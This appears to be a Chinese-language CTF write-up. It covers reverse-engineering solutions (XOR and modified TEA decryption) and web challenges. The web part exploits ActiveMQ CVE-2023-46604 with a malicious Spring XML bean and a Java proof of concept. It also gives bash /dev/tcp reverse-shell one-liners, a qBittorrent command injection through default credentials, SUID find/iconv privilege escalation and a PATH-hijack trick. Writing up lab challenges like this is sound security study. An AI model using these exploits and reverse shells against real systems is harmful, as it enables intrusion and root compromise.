## REVERSE
### change

感觉没啥好讲的

```CPP
#include <iostream>
#include <cstring>

using namespace std;

int main()
{
    char key[10] = "am2qasl";
    char flag[100] = {19,  10,  93,  28,  14,   8,  35,   6,  11,  75, 
   56,  34,  13,  28,  72,  12, 102,  21,  72,  27, 
   13,  14,  16,  79};
    int i;

    for(i = 0; i < 24; i++)
    {
        if(i % 2)
        {
            flag[i] ^= key[i % 7];
        }
        else
        {
            flag[i] = (flag[i] - 10) ^ key[i % 7];
        }
        printf("%c", flag[i]);
    }
    return 0;
}
```
### crackme2
通过SEH触发SMC，绕过反调后可以拿到真正的函数。写z3，代码过长了，就不放了。

### again!
bin1的python字节码读出来运行后可以得出来一个md5值`a405b5d321e446459d8f9169d027bd92`。虽然不知道为什么，但是拿着它挨个跟bin2异或一遍可以得到一个PE文件。

这个文件里面有一个魔改的TEA。可以写出代码：

```CPP
#include <iostream>
#include <cstring>

using namespace std;

int main()
{
    unsigned char flag[32] = {  195, 181, 111,  80,  69, 143,  53, 185, 199, 232,  26, 201, 128, 226,  32,  56, 131, 186,  58, 209,  84, 245,  92, 151, 107,   3,  82,  67,  71,   4, 210,  28};
    unsigned int i, sum = 0, key[4] = {0x1234, 0x2341, 0x3412, 0x4123};
    for(i = 0; i < 12; i++)
    {
        sum += 0x7937B99E;
    }
    for(i = 0; i < 12; i++)
    {
        *((unsigned int*)(&flag[28])) -= (((*((unsigned int*)(&flag[24])) ^ key[(sum >> 2) & 3 ^ 3]) + (sum ^ *((unsigned int*)(&flag[0])))) ^ (((16 * *((unsigned int*)(&flag[24]))) ^ (*((unsigned int*)(&flag[0])) >> 3)) + ((*((unsigned int*)(&flag[24])) >> 5) ^ (4 * *((unsigned int*)(&flag[0]))))));
        *((unsigned int*)(&flag[24])) -= ((*((unsigned int*)(&flag[20])) ^ key[(sum >> 2) & 3 ^ 2]) + (sum ^ *((unsigned int*)(&flag[28])))) ^ (((16 * *((unsigned int*)(&flag[20]))) ^ (*((unsigned int*)(&flag[28])) >> 3)) + ((*((unsigned int*)(&flag[20])) >> 5) ^ (4 * *((unsigned int*)(&flag[28])))));
        *((unsigned int*)(&flag[20])) -= ((sum ^ *((unsigned int*)(&flag[24]))) + (*((unsigned int*)(&flag[16])) ^ key[(sum >> 2) & 3 ^ 1])) ^ (((16 * *((unsigned int*)(&flag[16]))) ^ (*((unsigned int*)(&flag[24])) >> 3)) + ((*((unsigned int*)(&flag[16])) >> 5) ^ (4 * *((unsigned int*)(&flag[24])))));
        *((unsigned int*)(&flag[16])) -= ((sum ^ *((unsigned int*)(&flag[20]))) + (*((unsigned int*)(&flag[12])) ^ key[(sum >> 2) & 3])) ^ (((16 * *((unsigned int*)(&flag[12]))) ^ (*((unsigned int*)(&flag[20])) >> 3)) + ((*((unsigned int*)(&flag[12])) >> 5) ^ (4 * *((unsigned int*)(&flag[20])))));
        *((unsigned int*)(&flag[12])) -= ((sum ^ *((unsigned int*)(&flag[16]))) + (*((unsigned int*)(&flag[8])) ^ key[(sum >> 2) & 3 ^ 3])) ^ (((16 * *((unsigned int*)(&flag[8]))) ^ (*((unsigned int*)(&flag[16])) >> 3)) + ((*((unsigned int*)(&flag[8])) >> 5) ^ (4 * *((unsigned int*)(&flag[16])))));
        *((unsigned int*)(&flag[8])) -= ((sum ^ *((unsigned int*)(&flag[12]))) + (*((unsigned int*)(&flag[4])) ^ key[(sum >> 2) & 3 ^ 2])) ^ (((16 * *((unsigned int*)(&flag[4]))) ^ (*((unsigned int*)(&flag[12])) >> 3)) + ((*((unsigned int*)(&flag[4])) >> 5) ^ (4 * *((unsigned int*)(&flag[12])))));
        *((unsigned int*)(&flag[4])) -= ((sum ^ *((unsigned int*)(&flag[8]))) + (*((unsigned int*)(&flag[0])) ^ key[(sum >> 2) & 3 ^ 1])) ^ (((16 * *((unsigned int*)(&flag[0]))) ^ (*((unsigned int*)(&flag[8])) >> 3)) + ((*((unsigned int*)(&flag[0])) >> 5) ^ (4 * *((unsigned int*)(&flag[8])))));
        *((unsigned int*)(&flag[0])) -= (((sum ^ *((unsigned int*)(&flag[4]))) + (*((unsigned int*)(&flag[28])) ^ key[(sum >> 2) & 3])) ^ (((16 * *((unsigned int*)(&flag[28]))) ^ (*((unsigned int*)(&flag[4])) >> 3)) + ((*((unsigned int*)(&flag[28])) >> 5) ^ (4 * *((unsigned int*)(&flag[4]))))));
        sum -= 0x7937B99E;
    }
    for(i = 0; i < 32; i++)
    {
        printf("%c", flag[i]);
    }
    return 0;
}
```

## WEB

### Reverse and Escalation.

可以看到ActiveMQ的版本。直接打ActiveMQ的反序列化RCE漏洞CVE-2023-46604。把学长的exploit借来用。

构造一个恶意xml，开个http服务提供给题目容器。另外开ncat监听9001、9002端口

```xml
<beans xmlns="http://www.springframework.org/schema/beans" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xsi:schemaLocation="http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd">
  <bean id="pb" class="java.lang.ProcessBuilder" init-method="start">
    <constructor-arg>
      <list>
        <value>bash</value>
        <value>-c</value>
        <value><![CDATA[(sh)0>/dev/tcp/<octane's ip>/9001]]></value>
      </list>
    </constructor-arg>
  </bean>
</beans>
```

poc

```java
import javax.xml.crypto.Data;
import java.io.DataOutputStream;
import java.io.IOException;
import java.io.OutputStream;
import java.net.Socket;

public class ScratchExploit {
    public static void main(String[] args) throws IOException {
        Socket socket = new Socket("<ip>", 61616);
        OutputStream os = socket.getOutputStream();
        DataOutputStream dos = new DataOutputStream(os);
        dos.writeInt(0);// size
        dos.writeByte(31);// type
        dos.writeInt(0);// CommandId
        dos.writeBoolean(false);// Command response required
        dos.writeInt(0);// CorrelationId

        // body
        dos.writeBoolean(true);
        // UTF
        dos.writeBoolean(true);
        dos.writeUTF("org.springframework.context.support.ClassPathXmlApplicationContext");
        dos.writeBoolean(true);
        dos.writeUTF("http://<octane's ip>:9000/octane_attack.xml");

        dos.close();
        os.close();
        socket.close();
    }
}
```

直接注入基本的反弹bash的命令不一定每次都能成功。因此咱用了个比较稳的反弹shell方法。先在9001端口拿到一个无回显sh，再进一步运行命令把shell传递给9002端口，最终得到满血的bash。

```sh
bash -c "bash -i >& /dev/tcp/<octane's ip>/9002 0>&1"
```

然后就可以在bash上玩了。shell得到的是activemq用户，而/flag要root才能读，需要提权。枚举一下容器里的有用的东西，可以发现find有粘滞位。简单suid提权，用find执行命令就可以用root读取flag了。

```bash
find LICENSE -exec cat /flag \;
```

### Reverse and Escalation. II

前面打ActiveMQ和得到反弹shell的步骤和上一题一样的。从得到bash开始。

还是activemq低权限用户。/usr/bin/find依然有粘滞位。但find好像被换成了个奇怪的东西。把假find用curl发送过来研究一下。可以发现是需要预测随机数38次，过了随机数之后会以root权限用`system();`执行系统ls命令。

随机数种子用的是当前时间time_t，应该是精确到秒的，很容易预测。而对于它只会执行ls的问题，咱最后想出来了个好办法。`system();`函数继承当前用户的环境变量，因此可以试试把环境变量换掉，让它执行一个咱自己构造的假ls。

先写个假ls呢

```C
// ls.c
#include <stdio.h>
#include <stdlib.h>


int main()
{
    printf("Octane@ttack!\n");
    system("cat /flag");
    return 0;
}
```

再写个预测随机数的

```C
// octane_attack.c
#include <time.h>
#include <stdlib.h>


int main()
{
    char str[500] = "find";
    time_t seed = time(0);
    srand(seed);

    for (int i=0;i<39;i++)
    {
        int a = rand() % 23333;
        int b = rand() % 23333;
        sprintf(str, "%s %d", str, a+b);
    }

    system(str);
    return 0;
}
```

把上面两个exploit编译之后上传到题目容器的activemq目录中。chmod +x。

再新建一个子目录，把咱刚才传上来的假ls移动进去。把该子目录的路径加在用户环境变量path的最前面。

然后运行主程序octane_attack。octane_attack就可以根据相同的秒数预测出所有38个随机答案，再调用find并传入答案。find在校验答案之后会运行`system("ls");`。而由于环境变量path已经被咱换掉了，咱构建的假ls会被`system();`优先执行，从而实现root权限下的`cat /flag`命令执行，读到flag。


### Whose Home

居然是qb，咱天天玩的东西，太熟悉不过了。

admin+adminadmin默认账号密码登进去，可以从"新增torrent时运行外部程序"注入命令。用`bash -c "bash -i >& /dev/tcp/<octane's ip>/9002 0>&1"`反弹一个bash看看。这次发现iconv是有粘滞位的，还是用suid提权读flag。

```bash
iconv -f ASCII -t ASCII /flag
```
